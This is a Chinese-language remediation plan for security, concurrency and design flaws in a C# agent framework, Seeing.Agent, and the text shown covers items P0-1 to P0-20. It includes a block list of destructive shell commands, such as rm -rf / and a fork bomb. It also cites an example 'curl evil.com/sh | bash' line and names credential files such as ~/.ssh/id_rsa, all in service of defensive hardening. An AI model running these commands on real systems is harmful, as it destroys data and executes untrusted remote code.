# Seeing.Agent P0 问题逐个修复方案

> **日期:** 2026-07-31
> **范围:** 全部 28 个 P0 严重问题
> **格式:** 每项包含问题描述、详细修复方案代码、修复必要性评估

---

## 🔴 安全性（5 项）

---

### P0-1: Shell 命令注入 — 无危险命令过滤

**文件:** `src/Seeing.Agent/Tools/BuiltIn/Shell/BashTool.cs`
**位置:** 全体（353 行），`ExecuteCommandAsync()` 方法
**当前状态:** 完全不过滤危险命令模式

**修复方案:**

在 `BashTool` 类中添加危险命令模式检测，在 `ExecuteAsync()` 的第 117 行之前插入安全检查：

```csharp
// 在 BashTool 类中添加（第 22 行附近，常量区）
private static readonly HashSet<string> _blockedCommands = new(StringComparer.OrdinalIgnoreCase)
{
    "rm", "rmdir", "del", "format", "mkfs", "dd", "shutdown", "reboot",
    "halt", "poweroff", "init", "systemctl",
};

private static readonly string[] _blockedPatterns = new[]
{
    // Unix: 删除/覆盖关键目录
    "rm -rf /", "rm -r /", "rm -rf ~", "rm -rf .",
    // Unix: fork bomb
    ":(){ :|:& };:",
    // Unix: 覆盖磁盘
    "dd if=/dev/zero of=/dev/",
    // Unix: 权限提升滥用
    "chmod 777 /", "chmod -R 777 /",
    // Windows: 递归强制删除
    "del /f /s C:\\",
    // Windows: 格式化
    "format C:", "format D:",
    // Windows: 删除注册表
    "reg delete HKLM",
    // 重定向覆盖系统文件
    "> /etc/", "> /boot/", "> /sys/",
};

/// <summary>
/// 检查命令是否包含危险操作，返回 null 表示安全，否则返回拒绝原因
/// </summary>
private static string? CheckDangerousCommand(string command)
{
    if (string.IsNullOrWhiteSpace(command))
        return "空命令";

    var trimmed = command.Trim().ToLowerInvariant();

    // 1. 检查管道后接危险命令: curl xxx | bash
    if (trimmed.Contains("|"))
    {
        var parts = trimmed.Split('|');
        foreach (var part in parts)
        {
            var partTrimmed = part.Trim();
            // wget/curl 管道到 sh/bash
            if ((partTrimmed.StartsWith("bash") || partTrimmed.StartsWith("sh") ||
                 partTrimmed.StartsWith("zsh") || partTrimmed.StartsWith("powershell")) &&
                !partTrimmed.Contains("-c"))
            {
                return "禁止使用管道将输出传递给 Shell 解释器";
            }
        }
    }

    // 2. 检查命令替换：$(...) 或 `` ` ` ``
    if (trimmed.Contains("$(") || trimmed.Contains("$((") || trimmed.Contains("`"))
    {
        return "禁止使用命令替换/$()语法";
    }

    // 3. 检查危险模式
    foreach (var pattern in _blockedPatterns)
    {
        if (trimmed.Contains(pattern.ToLowerInvariant()))
            return $"禁止执行危险命令模式: {pattern}";
    }

    // 4. 检查命令名
    var firstWord = trimmed.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "";
    // 去掉路径前缀（如 /bin/rm → rm）
    var commandName = Path.GetFileName(firstWord);
    if (_blockedCommands.Contains(commandName))
    {
        // 允许安全变体：rm 带 -i 交互确认或 echo/which 查询
        if (commandName is "rm" or "rmdir" or "del")
        {
            // rm 只允许在明确非递归且不重要的场景（需显式许可）
            if (trimmed.Contains("-r") || trimmed.Contains("-rf") || trimmed.Contains("--recursive"))
                return $"禁止递归删除操作: {command}";
        }
        return $"禁止执行危险命令: {commandName}";
    }

    // 5. 禁止重定向写入（> >>）到非当前目录文件
    var redirectIndex = trimmed.LastIndexOf('>');
    if (redirectIndex > 0)
    {
        var target = trimmed.Substring(redirectIndex + 1).Trim();
        if (target.StartsWith("/") || target.StartsWith("~/") ||
            (target.Length >= 2 && target[1] == ':')) // Windows 盘符
        {
            return $"禁止重定向到绝对路径: {target}";
        }
    }

    return null; // 安全
}
```

在 `ExecuteCommandAsync()` 中第 161 行（权限检查之后）插入：

```csharp
// 在 ExecuteCommandAsync() 中，权限检查之后、获取 Shell 之前插入
var dangerCheck = CheckDangerousCommand(command);
if (dangerCheck != null)
{
    _logger.LogWarning("拒绝危险命令: {Reason}, 命令: {Command}", dangerCheck, command);
    return Failure($"命令被拒绝执行: {dangerCheck}");
}
```

**修复必要性: 🟢 必须修复**
- **风险等级:** 极高。LLM 可能被诱导执行 `rm -rf /` 或 `curl evil.com/sh | bash`
- **影响范围:** 所有使用 Bash 工具的 Agent
- **修复成本:** 低（约 80 行代码，插入两处）
- **回归风险:** 低（仅添加拒绝逻辑，不影响正常命令）

---

### P0-2: Shell 命令注入 — 元字符未转义

**文件:** `src/Seeing.Agent/Tools/BuiltIn/Shell/BashTool.cs:177`
**位置:** `string.Format(argFormat, command)` — 命令直接传入 Shell 参数

**修复方案:**

当前 Shell 启动方式为 `bash -c "{command}"` 或 `cmd /c "{command}"`，LLM 生成的命令可能包含未配对引号破坏外壳解析。应采用 **heredoc / 标准输入** 方式避免元字符问题。

方案一（推荐）：通过标准输入传递命令，避免 Shell 参数解析风险

```csharp
// 修改 ProcessStartInfo（替换第 174-184 行）
var startInfo = new ProcessStartInfo
{
    FileName = shell,
    WorkingDirectory = workdir,
    UseShellExecute = false,
    CreateNoWindow = true,
    RedirectStandardOutput = true,
    RedirectStandardError = true,
    RedirectStandardInput = true
};

// 不再将命令作为参数传递
// startInfo.Arguments = string.Format(argFormat, command); // 删除此行

// ... 保留环境变量设置 ...

// 启动后通过标准输入写入命令（第 223 行之后）
process.Start();
process.BeginOutputReadLine();
process.BeginErrorReadLine();

// 通过 stdin 写入命令，避免元字符注入
await process.StandardInput.WriteLineAsync(command);
await process.StandardInput.WriteLineAsync("exit"); // 确保命令执行后退出
process.StandardInput.Close();
```

方案二（备选）：当 stdin 管道不可用时，对命令进行 Shell 转义

```csharp
// 添加 Shell 转义方法（第 22 行附近）
private static string EscapeShellArgument(string command)
{
    // 将双引号替换为转义形式，然后用双引号包裹整个命令
    // " → \"
    // $ → \$ (bash)
    // ` → \` (bash)
    var escaped = command
        .Replace("\\", "\\\\")
        .Replace("\"", "\\\"")
        .Replace("$", "\\$")
        .Replace("`", "\\`");
    return $"\"{escaped}\"";
}

// 第 177 行改为
Arguments = string.Format(argFormat, EscapeShellArgument(command)),
```

**修复必要性: 🟡 强烈建议**（可选的 P0）
- 如果采用方案一（stdin），是最安全的做法，但需要测试所有 Shell 类型兼容性
- 如果采用方案二，转义降低了但不能完全消除风险
- **推荐方案一（stdin）+ P0-1 危险命令过滤组合**

---

### P0-3: 路径穿越防护未接入工具

**文件:** 
- `Tools/BuiltIn/FileSystem/FileSystemHelper.cs:324` — `IsPathWithinDirectory()` 存在
- `Tools/BuiltIn/FileSystem/ReadTool.cs:86-90` — 未调用
- `Tools/BuiltIn/FileSystem/WriteTool.cs:78-82` — 未调用

**当前状态:** `IsPathWithinDirectory()` 方法已正确实现但 **从未被任何工具调用**。ReadTool 和 WriteTool 仅检查 `Path.IsPathRooted`，不检查工作目录边界。

**修复方案:**

1. 在 `BuiltInToolBase` 中添加工作目录获取机制（一次修改惠及所有工具）：

```csharp
// src/Seeing.Agent/Tools/BuiltIn/BuiltInToolBase.cs
// 添加方法
protected string? GetWorkspaceRoot(ToolContext context)
{
    if (context.Services != null)
    {
        var workspace = context.Services.GetService<IWorkspaceProvider>();
        return workspace?.WorkspaceRoot;
    }
    return null;
}

protected ToolResult? ValidatePathWithinWorkspace(string filePath, ToolContext context)
{
    var workspaceRoot = GetWorkspaceRoot(context);
    if (workspaceRoot == null)
        return null; // 无工作区限制，允许

    if (!FileSystemHelper.IsPathWithinDirectory(filePath, workspaceRoot))
    {
        return Failure($"安全限制：文件路径必须在工作目录内。路径: {filePath}");
    }
    return null;
}
```

2. 在 `ReadTool.ExecuteAsync()` 第 90 行后添加：

```csharp
// 在 Path.GetFullPath(filePath) 之后插入
var pathCheck = ValidatePathWithinWorkspace(filePath, context);
if (pathCheck != null) return pathCheck;
```

3. 在 `WriteTool.ExecuteAsync()` 第 82 行后添加：

```csharp
// 在 Path.GetFullPath(filePath) 之后插入
var pathCheck = ValidatePathWithinWorkspace(filePath, context);
if (pathCheck != null) return pathCheck;
```

4. 同样修改 EditTool、GlobTool、GrepTool（均在 `Tools/BuiltIn/FileSystem/` 下）

**修复必要性: 🟢 必须修复**
- **风险等级:** 极高。LLM 可读写任意系统文件（`/etc/passwd`、`~/.ssh/id_rsa` 等）
- **影响范围:** 所有文件系统工具
- **修复成本:** 低（约 30 行，统一在基类实现）

---

### P0-4: WebFetch 完全无 SSRF 防护

**文件:** `src/Seeing.Agent/Tools/BuiltIn/Web/WebFetchTool.cs:76-79`
**当前状态:** 仅验证 URL 以 `http://` 或 `https://` 开头

**修复方案:**

在 `WebFetchTool` 中添加 SSRF 防护方法，在 `ExecuteAsync()` 第 79 行后插入：

```csharp
// 添加 IP 地址检查辅助方法（类内部）
private static readonly IPAddress[] _blockedIpv4Prefixes =
[
    IPAddress.Parse("10.0.0.0"),        // 10.0.0.0/8
    IPAddress.Parse("172.16.0.0"),      // 172.16.0.0/12
    IPAddress.Parse("192.168.0.0"),     // 192.168.0.0/16
    IPAddress.Parse("127.0.0.0"),       // 127.0.0.0/8
    IPAddress.Parse("169.254.0.0"),     // 169.254.0.0/16 (link-local, AWS/GCP metadata)
    IPAddress.Parse("0.0.0.0"),         // 0.0.0.0/8
];

private static readonly IPAddress[] _blockedIpv4Masks =
[
    IPAddress.Parse("255.0.0.0"),       // /8
    IPAddress.Parse("255.240.0.0"),     // /12
    IPAddress.Parse("255.255.0.0"),     // /16
    IPAddress.Parse("255.0.0.0"),       // /8
    IPAddress.Parse("255.255.0.0"),     // /16
    IPAddress.Parse("255.0.0.0"),       // /8
];

private static bool IsPrivateOrReserved(IPAddress address)
{
    if (IPAddress.IsLoopback(address)) return true;

    // IPv4 私有/保留地址
    if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
    {
        var bytes = address.GetAddressBytes();
        for (int i = 0; i < _blockedIpv4Prefixes.Length; i++)
        {
            var prefix = _blockedIpv4Prefixes[i].GetAddressBytes();
            var mask = _blockedIpv4Masks[i].GetAddressBytes();
            bool match = true;
            for (int j = 0; j < 4; j++)
            {
                if ((bytes[j] & mask[j]) != (prefix[j] & mask[j]))
                {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
    }

    // IPv6 回环
    if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
    {
        if (IPAddress.IPv6Loopback.Equals(address)) return true;
        if (address.IsIPv6LinkLocal) return true;
        // IPv6 唯一本地地址 fc00::/7, fe80::/10
        var b = address.GetAddressBytes();
        if (b[0] == 0xfc || b[0] == 0xfd) return true;
        if (b[0] == 0xfe && (b[1] & 0xc0) == 0x80) return true;
    }

    return false;
}

/// <summary>
/// 验证 URL 安全性（SSRF 防护），返回 null 表示安全，否则返回拒绝原因
/// </summary>
private static async Task<string?> ValidateUrlSafetyAsync(string url)
{
    try
    {
        var uri = new Uri(url);

        // 1. 阻止已知内网主机名
        var host = uri.Host.ToLowerInvariant();
        if (host is "localhost" or "127.0.0.1" or "[::1]" ||
            host.EndsWith(".local") || host.EndsWith(".internal"))
        {
            return "禁止访问内网地址";
        }

        // 2. DNS 解析并检查 IP
        var addresses = await Dns.GetHostAddressesAsync(uri.Host);
        foreach (var addr in addresses)
        {
            if (IsPrivateOrReserved(addr))
            {
                return $"禁止访问私有/内网 IP: {addr} ({uri.Host})";
            }
        }

        return null; // 安全
    }
    catch (Exception ex)
    {
        return $"URL 安全验证失败: {ex.Message}";
    }
}
```

在 `ExecuteAsync()` 中 URL 格式验证之后插入（第 80 行后）：

```csharp
// 在 URL 格式验证之后
var safetyCheck = await ValidateUrlSafetyAsync(url);
if (safetyCheck != null)
{
    _logger.LogWarning("SSRF 防护拒绝请求: {Reason}, URL: {Url}", safetyCheck, url);
    return Failure($"请求被安全策略拒绝: {safetyCheck}");
}
```

**修复必要性: 🟢 必须修复**
- **风险等级:** 极高。可被利用访问 AWS/GCP 元数据服务窃取凭据、攻击内网服务
- **影响范围:** WebFetch、WebSearch、CodeSearch 所有涉及 URL 的工具
- **修复成本:** 中（约 100 行代码，需 DNS 解析）

---

### P0-5: API Key 明文持久化到磁盘

**文件:**
- `Llm/ProviderConfig.cs:40-41` — `ApiKey` 是明文 `string` 属性
- `Configuration/SeeingAgentOptions.cs` — 写入 `seeing.json`
- `Core/Models/ConfigurationModels.cs:21` — 旧版 `SeeingAgentConfig.ApiKey`

**修复方案:**

使用 `System.Security.Cryptography.ProtectedData`（项目已引用）加密 ApiKey 后再持久化：

```csharp
// 新建文件: src/Seeing.Agent/Llm/ApiKeyProtection.cs
using System.Security.Cryptography;
using System.Text;

namespace Seeing.Agent.Llm
{
    /// <summary>
    /// API Key 保护服务 — 使用 DPAPI 加密存储
    /// </summary>
    public static class ApiKeyProtection
    {
        private static readonly byte[] _entropy = Encoding.UTF8.GetBytes("Seeing.Agent.ApiKey.v1");

        public static string Protect(string plainText)
        {
            if (string.IsNullOrEmpty(plainText)) return plainText;
            var data = Encoding.UTF8.GetBytes(plainText);
            var encrypted = ProtectedData.Protect(data, _entropy, DataProtectionScope.CurrentUser);
            return Convert.ToBase64String(encrypted);
        }

        public static string Unprotect(string encryptedBase64)
        {
            if (string.IsNullOrEmpty(encryptedBase64)) return encryptedBase64;

            // 如果已经是明文（非 Base64），直接返回（向后兼容）
            if (!TryFromBase64(encryptedBase64, out var data))
                return encryptedBase64;

            try
            {
                var decrypted = ProtectedData.Unprotect(data, _entropy, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted);
            }
            catch (CryptographicException)
            {
                // 解密失败，可能已经是明文
                return encryptedBase64;
            }
        }

        private static bool TryFromBase64(string s, out byte[] bytes)
        {
            try
            {
                bytes = Convert.FromBase64String(s);
                return true;
            }
            catch
            {
                bytes = Array.Empty<byte>();
                return false;
            }
        }
    }
}
```

修改 `ProviderConfig.ApiKey` 的序列化行为，使用自定义 JSON 转换器：

```csharp
// 新建文件: src/Seeing.Agent/Llm/ApiKeyJsonConverter.cs
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Seeing.Agent.Llm
{
    /// <summary>
    /// API Key JSON 转换器 — 序列化时加密，反序列化时解密
    /// </summary>
    public class ApiKeyJsonConverter : JsonConverter<string>
    {
        public override string? Read(ref Utf8JsonReader reader, Type typeToConvert, JsonSerializerOptions options)
        {
            var value = reader.GetString();
            return value != null ? ApiKeyProtection.Unprotect(value) : null;
        }

        public override void Write(Utf8JsonWriter writer, string? value, JsonSerializerOptions options)
        {
            if (value == null)
            {
                writer.WriteNullValue();
                return;
            }
            writer.WriteStringValue(ApiKeyProtection.Protect(value));
        }
    }
}
```

在 `ProviderConfig.cs` 中应用转换器：

```csharp
[JsonPropertyName("apiKey")]
[JsonConverter(typeof(ApiKeyJsonConverter))]
public string? ApiKey { get; set; }
```

**补充方案 — 环境变量支持（推荐同时实施）：**

在 `ProviderConfig.cs` 或 `OptionsProviderEndpointLookup.cs` 中添加：

```csharp
public string GetEffectiveApiKey()
{
    // 1. 环境变量优先（如 OPENAI_API_KEY / PROVIDER_{Id}_API_KEY）
    var envKey = Environment.GetEnvironmentVariable($"{Id.ToUpperInvariant()}_API_KEY");
    if (!string.IsNullOrEmpty(envKey)) return envKey;

    // 2. 配置文件中的值
    return ApiKey ?? string.Empty;
}
```

**修复必要性: 🟢 必须修复**
- **风险等级:** 极高。`seeing.json` 文件通常提交到 Git 或共享，API Key 泄露直接导致算力盗用
- **影响范围:** 所有 LLM Provider 配置
- **修复成本:** 中（约 80 行 + 添加 NuGet `System.Security.Cryptography.ProtectedData` 已有引用）
- **回归风险:** 低（DPAPI 在 Windows 上原生支持，Linux 需要 `libsecret` 或回退方案）
- **跨平台注意:** `ProtectedData` 在 Linux 上需要额外配置。建议提供回退到环境变量的方案

---

## 🔴 并发安全（8 项）

---

### P0-6: AgentRuntimeManager — `Dictionary` 无锁

**文件:** `src/Seeing.Agent/Core/AgentRuntimeManager.cs:39`
**当前:** `private readonly Dictionary<string, string> _sessionModelOverrides = new(...);`

**修复方案:**

最简单有效的修复：将 `Dictionary` 替换为 `ConcurrentDictionary`

```csharp
// 第 39 行改为
private readonly ConcurrentDictionary<string, string> _sessionModelOverrides = 
    new(StringComparer.OrdinalIgnoreCase);
```

同时修改 `SetSessionModelOverrideAsync()`（约第 274 行）中的用法：

```csharp
// 原: _sessionModelOverrides[agentName] = modelId;
// 改为:
_sessionModelOverrides.AddOrUpdate(agentName, modelId, (_, _) => modelId);
```

修改 `GetEffectiveModelIdAsync()`（约第 233 行）中的用法：

```csharp
// 原: _sessionModelOverrides.TryGetValue(agentName, out var modelId)
// 不变，ConcurrentDictionary 也有 TryGetValue
```

修改 `ClearSessionModelOverride()`（约第 335 行）：

```csharp
// 原: _sessionModelOverrides.Remove(agentName)
// 改为:
_sessionModelOverrides.TryRemove(agentName, out _);
```

额外修复：`_lastUsedModel` 和 `CurrentModel` 的赋值（第 304-306 行）使用 `Interlocked` 保证可见性：

```csharp
// 在类顶部添加
private object _modelLock = new();

// 在 SetSessionModelOverrideAsync 中
lock (_modelLock)
{
    CurrentModel = modelId;
    _lastUsedModel = modelId;
}
```

**修复必要性: 🟢 必须修复**
- **风险等级:** 高。并发调用会导致 `IndexOutOfRangeException` 崩溃
- **修复成本:** 极低（改 3 行 + 加 1 个锁）
- **回归风险:** 无（ConcurrentDictionary 是透明替换）

---

### P0-7: CommandRegistry — 4 个 `Dictionary` 无锁

**文件:** `src/Seeing.Agent/Commands/CommandRegistry.cs:51-57`
**当前:** 4 个普通 `Dictionary<...>` 无保护

**修复方案:**

替换为 `ConcurrentDictionary`：

```csharp
// 第 51-57 行改为
private readonly ConcurrentDictionary<(string Name, AgentRuntime Runtime), ICommand> _commandsByRuntime = new();
private readonly ConcurrentDictionary<string, ICommand> _defaultCommands = new(StringComparer.OrdinalIgnoreCase);
private readonly ConcurrentDictionary<(string Alias, AgentRuntime Runtime), ICommand> _aliasByRuntime = new();
private readonly ConcurrentDictionary<string, ICommand> _defaultAliases = new(StringComparer.OrdinalIgnoreCase);
```

相应的 `Register()` 方法中 `Remove` → `Add` 改为 `TryRemove` + `TryAdd` 或 `AddOrUpdate`：

```csharp
// 原: 先 Remove 再直接赋值
// 改为使用 AddOrUpdate / TryAdd
```

**修复必要性: 🟢 必须修复**
- **风险等级:** 高。命令注册表是高频读写组件
- **修复成本:** 极低（改 4 行声明 + 调整 Register/Unregister 方法调用）

---

### P0-8 ~ P0-13: 其他 6 个无锁集合（修复模式相同）

以下所有问题使用统一修复模式：

| # | 文件 | 当前类型 | 修复为 | 修复级别 |
|---|------|---------|--------|---------|
| P0-8 | `MCP/Factory/McpWrapperFactoryRegistry.cs:7` | `Dictionary<McpTransportType, IMcpClientWrapperFactory>` | `ConcurrentDictionary` | 🟢 |
| P0-9 | `Core/AgentDiscovery.cs:24` | `List<string>` | `lock` 保护 | 🟢 |
| P0-10 | `Session/Core/SessionEventPublisher.cs:8` | `List<IObserver<SessionEvent>>` | `lock` 保护 或 `ConcurrentBag` | 🟢 |
| P0-11 | `Decorators/ToolDecoratorRegistry.cs:28` | `List<Func<ITool, ITool>>` | `lock` 保护 + Apply 时快照副本 | 🟢 |
| P0-12 | `Core/Models/ExecutionPipeline.cs:12` | `List<IExecutionMiddleware>` | `lock` 保护 + 迭代前快照 | 🟢 |
| P0-13 | `Skills/OnlineParsers/OnlineSkillParserAggregator.cs:14` | `List<IOnlineSkillParser>` | `lock` 保护 或 `ToList()` 快照读取 | 🟢 |

**统一修复模式示例（以 AgentDiscovery 为例）：**

```csharp
// AgentDiscovery.cs
private readonly object _searchDirsLock = new();
// _searchDirectories 保持 List<string> 不变

public void AddSearchDirectory(string directory)
{
    lock (_searchDirsLock)
    {
        if (!_searchDirectories.Contains(directory))
            _searchDirectories.Add(directory);
    }
}

public IReadOnlyList<string> GetSearchDirectories()
{
    lock (_searchDirsLock)
        return _searchDirectories.ToArray();
}

public void ClearSearchDirectories()
{
    lock (_searchDirsLock)
        _searchDirectories.Clear();
}
```

**ToolDecoratorRegistry 特殊处理（需要迭代 + 注册并发安全）：**

```csharp
// 使用 ImmutableList 或快照副本
private readonly object _factoriesLock = new();

public void RegisterFactory(Func<ITool, ITool> factory)
{
    lock (_factoriesLock)
        _factories.Add(factory);
}

public ITool Apply(ITool tool)
{
    Func<ITool, ITool>[] factoriesSnapshot;
    lock (_factoriesLock)
        factoriesSnapshot = _factories.ToArray(); // 快照副本

    foreach (var factory in factoriesSnapshot)
        tool = factory(tool);
    return tool;
}
```

**修复必要性：全部 🟢 必须修复**
- 所有这些都是 Singleton 服务中的非线程安全集合
- 修复成本极低（每处 5-15 行）
- 无回归风险（仅添加线程保护）

---

## 🔴 DI 生命周期（2 项）

---

### P0-14: AgentExecutor 注册为 Singleton — 与文档冲突

**文件:** `src/Seeing.Agent/Extensions/ServiceCollectionExtensions.cs:599`
**文档要求:** Scoped（AGENTS.md:99-100）
**实际注册:** Singleton

**评估:**

AgentExecutor 当前构造函数注入：
- `IOptions<SeeingAgentOptions>` — Singleton 兼容
- `ISessionManager?` — 当前也是 Singleton
- `ILogger<AgentExecutor>` — Singleton 兼容

**修复方案：两种方向**

**方案 A（推荐 — 保持 Singleton，更新文档）:**

评估结论：AgentExecutor 当前没有 Scoped 依赖，所有依赖都是 Singleton 兼容的。并发安全已通过无状态方法实现。改为 Scoped 会引入不必要的 DI Scope 管理复杂度。

- 更新 AGENTS.md 中 DI 生命周期表，将 AgentExecutor 改为 Singleton
- 在类注释中添加说明：此服务为 Singleton，不应添加 Scoped 依赖

```csharp
// AgentExecutor.cs 注释改为
/// <summary>
/// Agent 执行引擎（Singleton 生命周期）
/// <para>注意：此服务为 Singleton，请勿添加 Scoped 依赖。如需 Scoped 服务，通过 IServiceScopeFactory 创建 Scope。</para>
/// </summary>
```

**方案 B（改为 Scoped，需评估影响）:**

如果未来架构要求 AgentExecutor 为 Scoped（如需要隔离的会话状态），则：

```csharp
// ServiceCollectionExtensions.cs:599 改为
services.AddScoped<AgentExecutor>();
```

同时需要确保所有注入依赖支持 Scoped 或使用 `IServiceScopeFactory`。

**修复必要性: 🟢 必须确认（但实际影响低）**
- **推荐方案 A**：文档对齐代码，不影响运行
- 当前 Singleton 注册与依赖兼容，无需紧急修改
- **修复成本:** 极低（文档 1 行修改）

---

### P0-15: SessionManager 注册为 Singleton — 与文档冲突

**文件:** `src/Seeing.Agent/Extensions/ServiceCollectionExtensions.cs:376-384`
**文档要求:** Scoped（AGENTS.md:99-100）
**实际注册:** Singleton

**评估:**

这是比 AgentExecutor 更复杂的问题。SessionManager 作为 Singleton 导致：
- `ConcurrentDictionary<string, SessionData> _sessionDataCache` 是全局共享的
- 多租户场景下会话数据互相可见
- `EnsureSessionAsync()` 存在竞态条件

**修复方案：Scoped（推荐）**

将 SessionManager 从 Singleton 改为 Scoped：

```csharp
// ServiceCollectionExtensions.cs:376-384 改为
services.AddScoped<SessionManager>(sp =>
    new SessionManager(
        store: sp.GetRequiredService<ISessionStore>(),
        compressor: sp.GetService<Seeing.Session.Compression.ICompressionStrategy>(),
        hookManager: sp.GetService<Seeing.Session.Hooks.IHookManager>(),
        eventPublisher: sp.GetService<ISessionEventPublisher>(),
        logger: sp.GetService<ILogger<SessionManager>>(),
        globalStore: sp.GetService<GlobalSessionStore>()));

services.AddScoped<ISessionManager>(sp =>
    sp.GetRequiredService<SessionManager>());
```

同时需要检查所有依赖方是否持有 SessionManager 的注入了正确的生命周期。对于 **本身是 Singleton 但依赖 SessionManager 的服务**（如 AgentExecutor），有两个选择：

1. AgentExecutor 也改为 Scoped（连锁影响大）
2. AgentExecutor 通过 `IServiceScopeFactory` 按需获取 `ISessionManager`：

```csharp
// AgentExecutor 中
public class AgentExecutor
{
    private readonly IServiceScopeFactory _scopeFactory;

    // 需要 ISessionManager 时
    private ISessionManager GetSessionManager()
    {
        var scope = _scopeFactory.CreateScope();
        // 注意：需要管理 scope 的释放
        return scope.ServiceProvider.GetRequiredService<ISessionManager>();
    }
}
```

**修复必要性: 🟢 必须修复（架构优先级高，但需仔细评估连锁影响）**
- **风险等级:** 高。多租户数据污染
- **修复成本:** 中（需连锁修改依赖方）
- **建议:** 先实施文档方案 A（暂时文档对齐为 Singleton），然后在后续 Sprint 中重构为 Scoped

---

## 🔴 接口设计（1 项）

---

### P0-16: IAgentManager 严重违反 ISP

**文件:** `src/Seeing.Agent/Configuration/IAgentManager.cs:11-179`
**问题:** 26 方法 + 1 事件 + 7 职责域

**修复方案:**

拆分为 5-6 个独立接口，保持向后兼容（原接口继承所有子接口）：

```csharp
// 1. Agent 查询
public interface IAgentQueryService
{
    Task<IReadOnlyList<AgentDefinition>> GetAgentsAsync();
    Task<AgentDefinition?> GetAgentAsync(string name);
    Task<IReadOnlyList<AgentDefinition>> GetSubAgentsAsync();
    Task<IReadOnlyList<AgentDefinition>> GetPrimaryAgentsAsync();
    bool HasAgent(string name);
    Task<IReadOnlyList<AgentDefinition>> GetAccessibleSubAgentsAsync(
        IReadOnlyList<PermissionRuleEntry> callerPermissions);
}

// 2. 默认 Agent 管理
public interface IDefaultAgentManager
{
    Task<string> GetDefaultAgentNameAsync();
    Task SetDefaultAgentAsync(string name);
    Task SetDefaultAgentAsync(string name, ConfigLevel level);
}

// 3. Agent 注册
public interface IAgentRegistrar
{
    Task RegisterAgentAsync(AgentDefinition agent);
    void UnregisterAgent(string name);
    Task<IAgent?> GetOrCreateAgentInstance(string name);
}

// 4. Agent 模型管理
public interface IAgentModelManager
{
    Task UpdateAgentModelAsync(string agentName, string modelId);
    Task<string?> GetEffectiveModelAsync(string agentName);
}

// 5. 配置编辑
public interface IAgentConfigEditor
{
    Task<IReadOnlyList<AgentEditModel>> GetAllEditModelsAsync();
    Task<AgentEditModel?> GetEditModelAsync(string name);
    Task SaveEditModelAsync(AgentEditModel model);
    Task SetAgentDisabledAsync(string name, bool disabled);
}

// 6. MD 文件管理
public interface IAgentMdFileManager
{
    Task<IReadOnlyList<AgentMdInfo>> GetAllMdInfoAsync();
    Task<string?> GetMdContentAsync(string name);
    Task CreateMdConfigAsync(string name, string content);
    Task SaveMdContentAsync(string name, string content);
    Task DeleteMdConfigAsync(string name);
    string GetMdFilePath(string name);
    string GetDefaultMdTemplate();
    string GenerateMdContent(AgentEditModel model);
}

// 原接口改为继承组合（向后兼容）
public interface IAgentManager :
    IAgentQueryService,
    IDefaultAgentManager,
    IAgentRegistrar,
    IAgentModelManager,
    IAgentConfigEditor,
    IAgentMdFileManager
{
    event EventHandler? ConfigChanged;
}
```

**修复必要性: 🟡 有条件修复**
- **风险等级:** 中。当前设计已使用 `#region` 分组，功能正确但接口过胖
- **修复成本:** 高（约 200 行，需要调整所有实现类和使用方）
- **回归风险:** 中（拆分接口可能打破现有的依赖注入绑定）
- **建议:** 在下一个大版本中实施，作为架构改进而非紧急修复

---

## 🔴 错误处理（8 项）

---

### P0-17、P0-18: HMAC 密钥读写空 catch

**文件:** `src/Seeing.Agent/Core/Permission/PermissionService.cs:306-331`

**修复方案:**

```csharp
private byte[] LoadOrGenerateHmacKey()
{
    var keyPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Seeing.Agent", "permission_hmac_key.bin");

    if (File.Exists(keyPath))
    {
        try
        {
            return File.ReadAllBytes(keyPath);
        }
        catch (FileNotFoundException)
        {
            // 文件在检查后被删除，回退到生成密钥
            _logger?.LogInformation("HMAC 密钥文件在读取前被移除，将生成新密钥");
        }
        catch (UnauthorizedAccessException ex)
        {
            _logger?.LogError(ex, "无权限读取 HMAC 密钥文件: {Path}", keyPath);
            throw; // 权限问题不应静默处理
        }
        catch (IOException ex)
        {
            _logger?.LogError(ex, "读取 HMAC 密钥文件 I/O 错误: {Path}", keyPath);
            throw;
        }
    }

    var key = new byte[32];
    RandomNumberGenerator.Fill(key);

    try
    {
        var dir = Path.GetDirectoryName(keyPath);
        if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            Directory.CreateDirectory(dir);
        File.WriteAllBytes(keyPath, key);
        _logger?.LogInformation("已生成并保存新的 HMAC 密钥到: {Path}", keyPath);
    }
    catch (Exception ex)
    {
        _logger?.LogWarning(ex, "无法持久化 HMAC 密钥到磁盘，每次启动将生成新密钥。路径: {Path}", keyPath);
        // 不抛出 — 至少内存密钥可用，虽然不持久化但不影响功能
    }

    return key;
}
```

**修复必要性: 🟢 必须修复**
- **修复成本:** 极低（改 20 行，添加日志和异常分类）
- **回归风险:** 无（仅增加日志和异常分类）

---

### P0-19: CancellationTokenSource.Cancel 空 catch

**文件:** `src/Seeing.Session/Execution/ExecutionStateManager.cs:60-62, 84`

**修复方案:**

```csharp
// 替换两处 catch { } 为
try { _cts?.Cancel(); }
catch (ObjectDisposedException)
{
    // CTS 已释放，正常情况
}
catch (AggregateException ex)
{
    // Cancel 触发的回调中抛出的异常
    _logger?.LogWarning(ex, "取消操作时回调抛出异常");
}
```

**修复必要性: 🟢 必须修复**
- **修复成本:** 极低

---

### P0-20: DI 初始化中的 `.GetAwaiter().GetResult()`

**文件:** `src/Seeing.Agent/Extensions/ServiceCollectionExtensions.cs:69, 263, 339`

**修复方案:**

使用 `AsyncHelper` 模式或改为异步初始化：

```csharp
// 方案：在 DI Lambda 中使用 Task.Run 保底 + 添加日志
services.AddSingleton<ISessionStore>(sp =>
{
    try
    {
        var workspace = sp.GetRequiredService<IWorkspaceProvider>();
        var path = Path.Combine(workspace.ProjectSeeingDirectory, "sessions");
        var store = new FileSessionStore(
            path,
            sp.GetService<ILogger<FileSessionStore>>());
        // 如果 store 需要异步初始化
        // Task.Run(() => store.InitializeAsync()).GetAwaiter().GetResult();
        return store;
    }
    catch (Exception ex)
    {
        var logger = sp.GetService<ILogger<FileSessionStore>>();
        logger?.LogCritical(ex, "DI 初始化失败：无法创建会话存储");
        throw;
    }
});
```

